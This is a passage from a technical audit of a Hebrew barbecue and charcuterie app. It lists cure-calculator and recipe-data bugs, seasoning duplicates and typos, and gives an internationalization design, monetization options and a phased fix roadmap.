- **Evidence:** `sausages_new.py:18` sets `cure=(2.5 if cure else None)` — the *rate*. `data.py` builders (`b_fresh` 538, `b_emul` 554, `b_pastrami` 570, `setcalc` 516) set `calc.cure` to the *type* `"1"`/`"2"`. The calculator renders `line('Cure #'+calc.cure, …)` (`build.py:2522`) and gates the dry-cure warning on `calc.cure==='2'`/`==='1'` (2525–2526). Verified post-merge: **47 makes** end with `calc.cure==2.5` (all SG sausages + `m-frank/morta/bolo/snack/sopr/sauci/cacc/nduja/droe`, all `sal-*`, `m-sucuk/loukaniko/linguica/lapcheong`).
- **Why it matters:** Each shows a nonsensical "Cure #2.5" and — because `2.5 !== '2'`/`'1'` — **none display the `⚠ מוצר מיובש לא מבושל — דיוק ה-Cure קריטי` warning or the 156 ppm note**. The safety tool fails silently on exactly the dried/fermented products where nitrite dosing is most dangerous; it also erases the #1-vs-#2 distinction.
- **Recommendation:** In `SG()` set `calc['cure']` to the type (`'1'`/`'2'`, inferred from Cure #2/smoke/dry) and put 2.5 in `cureRate` (the JS already reads `calc.cureRate||2.5`). One-line builder fix + parse the cure label.
- **Effort:** S

### [P1] 2 — Kabanos & Landjäger instruct Cure #1 on dried sausages; Landjäger label is self-contradictory
- **Evidence:** `sausages_new.py:8` builds the cure label as `cure if startswith('Cure') else 'Cure #1 '+cure`. `n-kabanos` (125, passes `cure="2.5 ג׳/ק״ג (Cure #2 עדיף)"`) → renders "Cure #1 2.5 ג׳/ק״ג (Cure #2 עדיף)" (says #1 *and* "#2 preferred"). `n-landjager` (129) identical. Both are `נקניק מיובש` → require **Cure #2**. `n-kabanos` also uses `salt=18` (1.8%).
- **Why it matters:** Users are told to use the wrong nitrite for a multi-day unrefrigerated dried product, and 1.8% salt is below the ~2.8–3% needed for water-activity safety in drying.
- **Recommendation:** Pass the full `"Cure #2 2.5 ג׳/ק״ג"` label for all dried SG sausages; raise kabanos salt to ~26–28 g/kg. (Fixing #1's helper cleans these labels.)
- **Effort:** S

### [P1] 3 — Six visibly duplicated seasonings in the picker
- **Evidence:** `build.py:14–18` deduplicates only EXT-vs-BASE — within-BASE dupes survive. The appended block (`seasonings.py` ~421–462) re-adds concepts already in BASE. Six exact name-collisions: `rub-raselhanout`+`rub-ras-el-hanout`, `rub-hungarian`+`rub-paprika-hun`, `sauce-chimi`+`sauce-chimichurri`, `sauce-criolla`+`sauce-salsa-criolla`, `sauce-salsaverde`+`sauce-salsa-verde-mx`, `sauce-namjim`+`sauce-nam-jim`.
- **Why it matters:** The same name appears twice — looks buggy, dilutes the "curated library" impression.
- **Recommendation:** Delete the 6 redundant entries (or dedup within BASE). Note the two "Salsa Verde" are genuinely different (Italian anchovy vs Mexican tomatillo) — disambiguate rather than delete.
- **Effort:** S

### [P1] 4 — Tzatziki shown misspelled ("דזטיקי"); Toum transliteration wrong
- **Evidence:** `seasonings.py:445` `sauce-tzatziki` heb="דזטיקי" (should be "צזיקי"). The correctly-spelled EXT `sau-tzatziki` ("צזיקי", `seasonings_ext.py:442`) is dropped by the English-name dedup — so the typo is what users see. Same: `sauce-toum` kept as "תום (שום)" (means "innocence"; should be "טום") while the better EXT "טום (שום לבנוני)" is dropped.
- **Why it matters:** A Hebrew-first app surfaces a misspelled dish name; the correct spelling exists but loses the dedup coin-flip.
- **Recommendation:** Fix `sauce-tzatziki` heb→"צזיקי", `sauce-toum` heb→"טום"; or make dedup prefer the better-authored entry.
- **Effort:** S

### [P2] 5 — Hebrew punctuation inconsistent app-wide (geresh ׳ vs ASCII ') — and it breaks dedup
- **Evidence:** `seasonings_ext.py` = 0 geresh / 316 ASCII apostrophes; `sausages_new.py` = 254 geresh / 35 apostrophes; `seasonings.py` = 158/53 (mixed); `data.py:250` declares geresh the standard. Same words appear both ways (ג׳ינג׳ר/ג'ינג'ר). Because the Hebrew-name dedup (15) compares raw strings, "צ׳ימיצ׳ורי" (geresh) ≠ "צ'ימיצ'ורי" (apostrophe) → near-dupes slip through.
- **Recommendation:** Normalize to geresh (U+05F3) across `seasonings_ext.py` + the appended `seasonings.py` block; normalize both forms before the dedup comparison.
- **Effort:** M

### [P2] 6 — Salt/cure calculator has no data for 18 makes — including safety-critical cured sausages
- **Evidence:** `sausage_smoked` (`data.py:379`) and `sausage_dry` (396) return builds with **no `calc` key**; `b_shawarma` sets `calc=None` (586). 18 makes have no calc — `m-snack, m-sopr, m-sauci, m-cacc, m-nduja, m-sucuk, m-loukaniko, m-linguica, bbq-hotlinks` (fermented/dried/smoked) + all `s-*` shawarmas + 4 BBQ. (SPECIALS avoid this via `setcalc` 520–526; MAKES have no equivalent.)
- **Why it matters:** For `m-sopr/sauci/cacc/nduja/sucuk` the phase text says "מלח 28–30 ג׳/ק״ג" but the structured calculator — the safety tool — can't run.
- **Recommendation:** Add a `calc=` to `sausage_smoked`/`sausage_dry`: `dried → {salt:28, cure:'2'}`, `smoked → {salt:18, cure:'1'}`.
- **Effort:** S

### [P2] 7 — Dry-cure salt inconsistent between the two sausage systems (and low in places)
- **Evidence:** NEW_SAUSAGES dried use 22–24 g/kg (`n-milano/fuet/pepperoni/kulen`=24, `n-csabai/sremska`=22, `n-kabanos`=18), while `data.py`'s own dry-cure standard is 28–30 (`b_salumi` calc `salt=30` 792; `sausage_dry` text "28–30").
- **Why it matters:** Same product class, two salt regimes; 2.2% (csabai) / 1.8% (kabanos) are low for the Aw safety hurdle in unrefrigerated drying.
- **Recommendation:** Standardize dried-sausage salt to ~28 g/kg across both systems.
- **Effort:** S

### [P2] 8 — 28 of 47 SPECIALS have no rich description
- **Evidence:** `SPEC_DESC` (`descriptions.py:153`) covers only specials #1–19. All cheeses from `צ׳דר מיושן` (spec-20) through spec-47 + `חלומי` fall back to the terse one-line `note`. All 130 CUTS have full `CUT_DESC`.
- **Recommendation:** Add SPEC_DESC for the 28 cheeses (or accept the note as canonical and drop the two-tier system).
- **Effort:** M

### [P2] 9 — 12 house rubs carry no flavor/base/heat tags
- **Evidence:** `seasoning_tags.py` has no `hrub-*` keys; `build.py:22–25` defaults them to `base='יבש'`, `heat=0`, `flavor=[]`. Affected: all `hrub-salt-pepper, salt-only, garlic-rosemary, salt-pepper-garlic, sweet-paprika, herb-butter, citrus-herb, mustard-herb, five-spice-salt, kabab, salt-sugar-cure, butter-honey-veg`.
- **Why it matters:** These are the *default* rub for every cut (via `house_rub_map`), yet flavor-filtering never surfaces them and heat reads 0 even for `hrub-kabab`/`hrub-sweet-paprika`.
- **Recommendation:** Add 12 tag rows.
- **Effort:** S

### [P2] 10 — Wrong-script characters in a sausage origin
- **Evidence:** `sausages_new.py:25` `n-thuringer` origin="🇩🇪 תورينגיה" contains **Arabic** letters و (U+0648) + ر (U+0631) inside the Hebrew word; should be "תורינגיה".
- **Recommendation:** Replace with all-Hebrew "תורינגיה".
- **Effort:** S

### [P3] 11 — Stale catalog metadata + fragile cross-kind dedup
- **Evidence:** `seasonings.py:2` header says "96 מתכונים" — actual merged total is 301. Separately, 53 EXT items are silently dropped, some via cross-*kind* English-name collisions (EXT `sau-kc-classic` dropped because rub `rub-kc` shares "Kansas City"; `sau-buffalo`, `mar-shawarma`, `rub-nashville` likewise). Losses are redundant here but the cross-kind keying is a latent hazard.
- **Recommendation:** Fix the header; dedup by id+kind. **Effort:** S (comment) / M (dedup).

### [P3] 12 — Field type/format inconsistencies
- **Evidence:** `calc.salt` is a string in 5 SG sausages (`"18"/"16"/"15"`) but int elsewhere (JS string-concat risk in the calculator). The `cont` field mixes gershayim vs straight quotes — `build.py:21` already patches `'ישראל/מזה״ת'→'ישראל/מזה"ת'` at build. `חלומי` has `smt=""` vs `None` elsewhere. **Effort:** S

### [P3] 13 — Glossary (52) misses concepts the recipes use
- **Evidence:** Used but undefined: equilibrium curing (`b_salumi`/bacon phases), confit/קונפי (cuts 45,47), dextrose/דקסטרוז (`sausage_dry` phase 3), Fermento (`n-summer`), spatchcock/ספאצ'קוק (cut 38), caul fat/שומן כרס (`n-sheftalia`). Exactly the terms a beginner looks up. **Effort:** S

### [P3] 14 — Source citations — strong, minor polish only
- **Evidence:** 100% coverage (130/130 cuts, 47/47 specials, 102/102 makes), **1008 ref blocks, 0 missing a URL**, reputable domains (amazingribs 249, meatsandsausages/Marianski 173, Baldwin 167, plus ATK/Anova/ThermoWorks/USDA FSIS/Hank Shaw). A genuine strength. Minor: 120/1008 blocks have no `note`; every item shares one `verified: 2026-07-12` stamp (no per-item staleness). `house_rub_map` is fully valid (all 130 cuts mapped, no orphans). **Effort:** S
- **Note (not a defect):** 37 cuts have `tgt < safe` (e.g. n=41 chicken breast tgt 68 / safe 74) — *intentional*, documented via the Pasteurization/4-Hour-Rule glossary; SV safety comes from time×temp. The non-SV grill/smoke path for poultry leans entirely on the user reading that glossary; a brief inline hold-time note on white-meat poultry cards would harden the messaging.

**Content Top 3:** ① Fix `calc.cure` (#1) — restores the safety warning + correct Cure label on 47 recipes. ② Fix the Cure #1/#2 labels + kabanos salt (#2). ③ Remove the 6 duplicate seasonings + the tzatziki/toum typos (#3–#4).

---

## §9 · Multilingual + smart translation

*Baseline (measured): ~233K translatable Hebrew chars — **24% UI chrome / 76% data-driven content** (makes 69K, seasonings 56K, cuts 23K, builds 19K in the data; 3,042 distinct quoted Hebrew literals + 523 backtick templates in the chrome). No app-level i18n today; the only bilingual code is voice (`vcTranslateToEn` + `vcTransCache` Map). Root is `<html lang="he" dir="rtl">` (115).*

### [P0] 1 — Safety numbers live in two channels — one safe, one lethal for AI translation
- **Evidence:** Safe — `calcBoxHTML`/`wireCalcBox` (2488–2523): salt/cure/sugar computed live in JS from structured fields; only Hebrew *labels* in the template, numbers never in prose. Unsafe — `sausages_new.py:11,16` bake numbers into free text (`f"מלח {salt} ג׳/ק״ג, Cure #1 …"`), phase bodies read `"עד 71° פנים"`, `"חלוט 75-80° (לא רתיחה!)"`, plus the auto-appended `build.py:62` `f"בשל עד {_tgt} (מד-חום)"`. `roadmap-vNext.md:13` already codifies the policy; `AI_JSON_SYS` (4324) already tells the model to omit safety numbers.
- **Why it matters:** A runtime AI translation of a phase string can silently corrupt a cure %, an internal temp, or invert "לא רתיחה" (do not boil). In charcuterie this is a botulism/pasteurization hazard, not cosmetic. (Theme **T1**.)
- **Recommendation:** Never AI-translate cure/temp/salt prose. (a) Extract numbers to structured fields rendered `calcBox`-style so they bypass translation; (b) for residual prose, a numeric-invariant guard — tokenize all `\d+([.-]\d+)?\s*(°|%|ג׳|מ״ל|ק״ג|ל׳|ש|דק)` before translation and reject/flag if the numeric+unit multiset changed. Mark safety strings `noMT` → human-reviewed translations only.
- **Effort:** M

### [P0] 2 — `eng` field is load-bearing control-flow, not a translation slot
- **Evidence:** 7 branches switch Hebrew recipe text on the English name: `c.eng.includes('Garlic')`, `'Ribs'`, `'Cauliflower'`, `'Cabbage'` (2049–2081); identity keys `metaCut`/`metaMake` build `key:'cut-'+c.n` (2346–2348); search concatenates `heb+' '+eng` (1984, 2266). `eng` is *also* shown as a decorative subtitle (`.en` divs 2212/2241/2255).
- **Why it matters:** The instinct "`eng` is already the English translation, just swap it in" is wrong — repurposing it would break the vegetable-smoking recipe generator, and English is already on-screen as chrome (so a naive "add English" looks done but isn't a language mode).
- **Recommendation:** Freeze `eng` as a stable language-neutral identifier for logic/keys; introduce a separate localized display-name map keyed by the stable item key (`cut-1`, `make-n-thuringer`), never by Hebrew or `eng`. Replace the `eng.includes(...)` branches with an explicit tag (e.g. `veg:'garlic'`).
- **Effort:** M

### [P0] 3 — No keyed-string layer exists — introduce `t(key)` as the seam
- **Evidence:** 3,042 distinct Hebrew literals inlined directly in templates; e.g. `vcRender` (4948–4987) hardcodes ~20 UI strings, toasts like `'מפתח לא תקין'` (5018), panel copy 4031/4052. No `t(`, `i18n`, `locale`, or `navigator.language` anywhere.
- **Why it matters:** Every other i18n decision (bundles, host deferral, per-language dir) needs a single indirection point; without it, "multilingual" means editing thousands of call sites.
- **Recommendation:** Generate a keyed table at build time in build.py: walk the templates, replace each chrome literal with `t('k.NNN')`, emit `LANG['he']={...}` inline (zero-latency default) + lazily-fetched `lang.en.json` etc. Ship a tiny runtime: `function t(k){return (LANG[curLang]&&LANG[curLang][k]) ?? LANG.he[k] ?? k;}` with Hebrew fallback.
- **Effort:** L (mechanical but broad; scriptable extraction reduces risk)

### [P1] 4 — Static vs AI split — chrome+safety static, long-form content AI-with-cache
- **Evidence:** Content volume: makes 297,950 B / seasonings 200,822 / cuts 273,485 of mostly Hebrew prose. Runtime AI translation already works: `vcTranslateToEn` (5027, temp 0.2) with a cache Map (`vcTransCache` 5026).
- **Why it matters:** ~56K chars of chrome is human-translatable once and small; ~177K chars of catalog prose × N languages is not economically human-translated up front but is exactly what BYOK-Gemini is good at.
- **Recommendation:** Three tiers — **Static/human (build-time):** all chrome, glossary, category labels, and all safety-critical strings (`noMT`); **AI-at-runtime, cached:** long `desc`/`origin`, non-safety phase narration, seasoning blurbs; **Never translated:** `calcBox` numeric outputs. Item names get a curated static translation (few, high-visibility); bodies fall back to AI.
- **Effort:** M

### [P1] 5 — AI translation cache is in-memory only — persist and key it
- **Evidence:** `vcTransCache=new Map()` (5026) is per-session; `store` (2110) already persists everything else under `mk-*`.
- **Why it matters:** Without persistence every language switch re-hits Gemini (cost, latency, quota — note 429 handling at 4929); offline gets no translated content.
- **Recommendation:** Back the cache with `store`, keyed by `hash(sourceText)+targetLang+contentVersion`; evict by DATA version; add an `mk-mtcache` budget cap with LRU (mirror `gemCache.size>40` at 4902).
- **Effort:** S

### [P1] 6 — Bundle-size: keep Hebrew inline, lazy-load other languages
- **Evidence:** `DATA = __DATA__` injected as one 888 KB blob (1499/7485). Static per-language *chrome* bundles are tiny (~56K chars ≈ <60 KB each). Static per-language *content* would roughly clone the 177K-char data mass per language.
- **Why it matters:** Inlining N languages of full content would multiply the 1.5 MB file, defeating the single-file/PWA cold-load model.
- **Recommendation:** Inline only Hebrew; emit sibling `lang.<code>.json` for chrome + curated names + safety strings (small, static, human-reviewed), lazy-fetched on switch and SW-cached; leave long-form content to the runtime AI+localStorage cache.
- **Effort:** M

### [P1] 7 — Locale formatting is hardcoded `he-IL`
- **Evidence:** 6 hardcoded `he-IL`: `fmtDate` (3233), `fmtClock` (4814), dates at 6164/6393/6403. `vcLocale` (4852) is a binary `he-IL`/`en-US` map.
- **Recommendation:** Route all `toLocale*` through a `curLocale()` derived from the active language; generalize `vcLocale` to a lookup table.
- **Effort:** S

### [P2] 8 — RTL foundation is strong; a handful of physical rules need `dir`-awareness for LTR
- **Evidence:** Good hygiene — 19 `inset-inline`, 17 `margin-inline`, 10 `padding-inline`; only 2 physical `left:`/3 `right:`, all decorative (search icon 183, `.cnav` centering 355, fold-corner 412, tile accent 216). One dir-aware rule exists: `[dir=rtl] .panel{transform:translateX(103%)}` (612). LTR gaps: 7× `text-align:right` (1049 etc.), several decorative `border-right:3px` accents (1049, 1111, 1115, 1159, 1192).
- **Recommendation:** Flip `dir` on `<html>` per language (he/ar/fa→rtl, else ltr); convert `text-align:right`→`start`, decorative `border-right`→`border-inline-start`; mirror the ~5 physical-offset rules only where not purely centered.
- **Effort:** S

### [P2] 9 — Category identity is a Hebrew string — needs a label layer
- **Evidence:** `CAT_COLOR` keyed by Hebrew (2131–2138: "בקר","חזיר"…); items carry `cat:"בקר"`; search folds `cat` into the query (2266). GLOSSARY groups are Hebrew keys too (`data.py:193`).
- **Recommendation:** Keep the Hebrew category value as the internal key; add `catLabel(cat, lang)` for display only. Same for glossary groups.
- **Effort:** S

### [P2] 10 — Module-vs-standalone: design a `Locale` seam, no host assumptions
- **Evidence:** Zero coupling today (grep `matkonet|module|iframe|postMessage|host` → empty). Language state today would be a `store` key like the voice `mk-vclang`/`mk-vcanslang` (4850).
- **Why it matters:** As a module in `matkonet`, the host owns locale; standalone, the app must. The seam must not hardcode either.
- **Recommendation:** Single source of truth `getLang()`/`setLang()` from a pluggable provider — **standalone:** `store.get('mk-lang')` (default `navigator.language`, fallback `he`); **host:** if `window.__MATKONET_HOST__`/an injected `matkonet.locale`/a `postMessage('locale',…)` handshake is present, read + subscribe to the host locale and `setLang` forwards/no-ops. Detect at boot; the app only ever calls `getLang()`. The host supplies a language *code* only — translations remain the module's asset.
- **Effort:** M

### [P3] 11 — Voice machinery is a working prototype to generalize, not replace
- **Evidence:** Separate input/answer language (`vcLang`/`vcAnsLang` 4850–4851), language-matched prompts (`vcBuildAskPrompt` 5072), forced-language answers, graceful "no key → speak Hebrew + toast" (5048–5053), binary `he/en` toggle (`.vc-langbtn` 4970), tested via `window.__vcTransMock` (5030).
- **Recommendation:** Promote `vcTranslateToEn` to a generic `mtTranslate(text, targetLang, {noMT})` used by both voice and content rendering; extend the binary locale map to N languages; reuse the mock seam for tests.
- **Effort:** S

**Recommended approach (5 bullets):** ① One seam — build-time `t(key)` (Hebrew inline + fallback), `curLocale()`, `dir`, all derived from a pluggable `getLang()`. ② Split by risk — chrome+glossary+category+safety static & human-reviewed; long-form prose AI-at-runtime; numeric outputs language-neutral via `calcBox`. ③ Protect the numbers — extract to structured fields + numeric-invariant guard + `noMT`. ④ Keep the file lean — inline only Hebrew; small static `lang.<code>.json` lazily; persist AI translations by `hash+lang+dataVersion`. ⑤ Order — `en` first (validates LTR + the ~12 physical CSS rules), then `ar`/`ru`, then `es`/`fr`/`de`.

**i18n Top 3:** ① Safety guard (P0-#1) — number-extraction + numeric-invariant check + `noMT`. ② `t()` seam + `getLang()` provider (P0-#3) — unblocks everything. ③ Generalize the voice translator into a cached content engine (#5) + render `en` end-to-end.

---

## §10 · Business model / monetization

*Verified asset base: 279 items (130 CUTS/47 SPECIALS/102 MAKES); the **verified-source moat** (`sources.py` 415 KB, merged `build.py:88–95`, rendered `sourcesBlock` 2640, incl. order-effect + pasteurization warnings); **BYOK, owner pays $0** (`gemKey()` 4871, `aiAvail()` 4309, `aiJSON()` 4333 → `gemini-2.5-flash`, `thinkingBudget:0`, 1000–1600 max tokens, search off by default; only `askGemini` 4272 turns on `google_search`); the cure/salt safety engine (equilibrium brine 2514; AI refuses safety numbers, app injects presets 6709–6719); commerce already latent (charcoal suppliers 3881–3897, gear-gap purchase suggestions 4013, per-make materials 7057). Constraint: no backend/accounts/payments today (`ai-prd.md` §5 Non-Goals), but `product.html:324` already telegraphs "מתכונת בענן — חשבונות, סנכרון… ללא צורך במפתח אישי".*

### [P0] Managed-AI tier — the app brings the key, user brings nothing
- **Grounding:** All 7 features route through one seam (`aiJSON()` 4333 + `askGemini()` 4272). Swapping the endpoint from `generativelanguage.googleapis.com`+`gemKey()` to your own proxy is a one-function change; the BYOK wall is `gemKey()`/`aiAvail()` — managed AI just makes `aiAvail()` true for subscribers.
- **The model:** Subscription, **₪19–29/mo or ₪149/yr** (~$5–8). A thin proxy injects *your* Gemini key and meters usage.
- **Run-cost:** Structured calls ~3K in + 1.2K out ≈ **$0.004/call**; 50 actions/mo ≈ $0.20. The driver is search-grounded chat (~$0.035/query); 30/mo ≈ $1. All-in **~$0.30–1.50/paying-user/mo → 80–95% gross margin** at ₪19–29. Infra: a Cloudflare Worker (already on Cloudflare Pages) + Workers KV for quota + Stripe/Paddle (~3–5%).
- **Why it fits:** BYOK is the single biggest adoption wall for non-technical Hebrew users; AI is naturally server-gated (can't be pirated from view-source), unlike content; margins are unusually good because the calls are deliberately cheap.
- **Risks/friction:** Requires accounts, payments, a backend — the three things the app pointedly lacks; relaxes `ai-prd.md` Non-Goals; you now hold the Gemini bill (meter the search path).
- **Effort:** M standalone / S as a matkonet module.

### [P1] Affiliate / commerce inside the guides
- **Grounding:** `build.py:3881–3897` lists suppliers by fuel; `4013` surfaces "purchase suggestion" on gear gaps; materials lists per make (7057); cure recipes need Cure #1/#2, casings, cultures.
- **The model:** Affiliate/referral on charcoal, smokers, sealers, grinders, cure salts, casings (commission 3–8%). Zero price to the user; ~$0 run-cost; ships in the HTML.
- **Why it fits:** The recommendation surface is already built and trusted (each fuel has heat/burn/smoke profile + "best for" + named supplier); contextual buy-links convert far better than banners and don't break the editorial tone; cure salts/casings are a genuine "where do I get this" pain.
- **Risks/friction:** Israeli affiliate programs are thin; modest commissions; low ceiling; must label sponsored links honestly to protect source-verified neutrality.
- **Effort:** S.

### [P1] Premium content / craft packs — one-time unlock
- **Grounding:** 102 MAKES + the cure calculator (2514) + verified cure/safety sources; the multi-phase build engine (`SG()`) already produces salumi/dry-cure programs.
- **The model:** Paid packs — "Dry-cured salumi", "Whole-hog & pastrami", "Fermented sausage / pH-controlled" — **₪29–59 each** or a **₪99 lifetime "Craft" bundle**. One-time. ~$0 run-cost.
- **Why it fits:** The serious-charcuterie hobbyist is the segment with real willingness-to-pay, and the verified-source + safe-cure-calc combo is what a blog can't give.
- **Risks/friction:** **Piracy** — it's one client-side HTML; real gating needs server-delivered pack data or soft honor-system license. This is the core tension with local-first, and why AI (server-gated) is a cleaner first paywall.
- **Effort:** M (authoring + license/unlock).

### [P2] B2B "Pro" — caterers, butchers, small producers
- **Grounding:** Event wizard, multi-day work-plan scheduler with cure timelines, type-aware quantity calculator, kosher filter + auto-substitution, the printable butcher note (`product.html:275`), print-to-PDF.
- **The model:** **₪99–199/mo** per business — seat/account-based, invoicing, multi-event, branded PDFs.
- **Why it fits:** A caterer running 3-day charcuterie + smoke programs needs backward-scheduling + quantities + a kosher-safe menu + a shopping list; the kosher engine + Hebrew-first cut-translation are a moat for the Israeli pro market.
- **Risks/friction:** Small TAM; needs accounts/roles/invoicing/support; sales-led.
- **Effort:** L.

### [P3] License the verified-source dataset / white-label
- **Grounding:** `sources.py` (415 KB cited, safety-verified temp/time/cure) + the render pipeline (`sourcesBlock`, `gen_sources.py`).
- **The model:** License the structured cited dataset / a white-labeled shell to appliance or meat brands or culinary schools (flat or per-unit).
- **Why it fits:** The dataset *is* the moat — provenance + safety verification is expensive to reproduce and legally reassuring for a hardware brand.
- **Risks/friction:** Enterprise sales, contracts, support; a distraction from the consumer product.
- **Effort:** L.

**The BYOK crux:** BYOK is a great engineering decision and a bad growth decision — $0 AI cost for the owner, but it gates the app's most differentiated surface behind a task most Hebrew-first mobile users never complete (create a Google AI Studio key, understand quotas, paste it). The app degrades gracefully (every AI button falls back to a local engine, 6373/6427), so the AI is effectively invisible to the majority. Managed AI is the natural first paywall: it removes the highest-friction step, the calls are engineered cheap (80–95% margin), and unlike content it can't be pirated from view-source. **Keep BYOK as a free tier** — power users cost you nothing and shouldn't be forced to pay; sell managed AI to the non-technical majority (also softens "you monetized the AI").

**Recommended sequence:** ① affiliate commerce + one-time "Craft" unlock (lowest effort, zero backend, respects no-account ethos; validates willingness-to-pay) → ② managed-AI tier (the real revenue + the BYOK fix; as the platform's tier if imminent, else a Cloudflare Worker + Stripe/Paddle + KV) → ③ B2B Pro and ④ dataset/white-label once accounts+payments exist.

**Monetization Top 3:** ① Managed-AI tier (P0) — highest margin, converts the BYOK wall, un-pirateable. ② Affiliate commerce in existing guides (P1, now) — S, no backend, surfaces already built. ③ Premium "Craft" packs (P1) — monetizes the willing segment on the verified-source moat.

---

## §11 · Standalone vs. module-in-`matkonet`

matkonetesh is planned to become a module inside a larger `matkonet` platform (PRD later) while remaining usable standalone. That constraint threads through several findings and sharpens the priorities:

- **It raises the stakes on T2 (extract CSS/JS).** A clean `app.js`/`app.css` boundary with a defined public surface is exactly what a module needs; the current one-file, one-global-scope model (arch #1/#3/#5) is the opposite of embeddable.
- **It defines the i18n seam (§9 #10).** Design `getLang()`/`setLang()` as a pluggable provider now: standalone reads `store`; as a module it defers to the host locale via `window.__MATKONET_HOST__` / an injected `matkonet.locale` / a `postMessage` handshake. The host supplies a language *code* only — translations stay the module's asset.
- **It splits the monetization cleanly (§10).** **matkonetesh owns** the revenue lines that fit local-first and need no infra — **affiliate + content packs**. **The `matkonet` platform owns** the infra-heavy lines with cross-vertical scale — **managed AI + accounts/sync + B2B billing**. matkonetesh contributes as the platform's differentiating **premium "Fire & Charcuterie" vertical** and an **acquisition funnel**; the verified-source moat is what justifies the platform charging at all. **Don't** build a second payments/accounts stack in matkonetesh if `matkonet` is imminent — build the Worker proxy only if you need standalone revenue *before* the platform ships.
- **State/persistence (arch #3, PWA #6/#7).** A `KEYS` registry + a single `mk-schema` migration runner also make it far easier to hand persistence off to (or federate it with) a host platform later.

---

## §12 · Suggested execution roadmap

- **Wave 0 — Safety & security hotfix (S–M, do immediately):** Content #1 (cure warning), Content #2 (nitrite labels), AI #1 (`esc()` XSS). Small, high-stakes, shippable to `main` before anything else.
- **Wave 1 — Make the app work for everyone (S–M):** UX #1 (catalog→menu), UX #2 (resume), a11y #1 (keyboard operability — central handler first), UI #1/#2 + a11y #2 (default-theme contrast + charcoal), a11y #3 (timers). "The product does its job."
- **Wave 2 — Foundations (M):** arch #1 (extract CSS/JS), perf #2 + PWA #4 (`JSON.parse` + `store` quota), PWA #1/#2 + perf #1/#5 (service worker + self-hosted fonts), perf #4 (search debounce/memoize), arch #2 (data-pipeline drift). Enables tooling, i18n, and the module boundary.
- **Wave 3 — Strategic tracks (M+):** i18n P0 (T1 safety guard + `t()` seam + English), then monetization (affiliate now → managed-AI). Sequence per §9/§10/§11 and the eventual `matkonet` PRD.

*Open decision for you:* which wave(s) to green-light, and whether the i18n + monetization foundations should assume the `matkonet` platform (defer accounts/AI infra to it) or ship standalone-first. Waves 0–2 are platform-agnostic. Nothing has been implemented; `main`/v149 is the stable baseline and all of this is isolated on `improvements`.
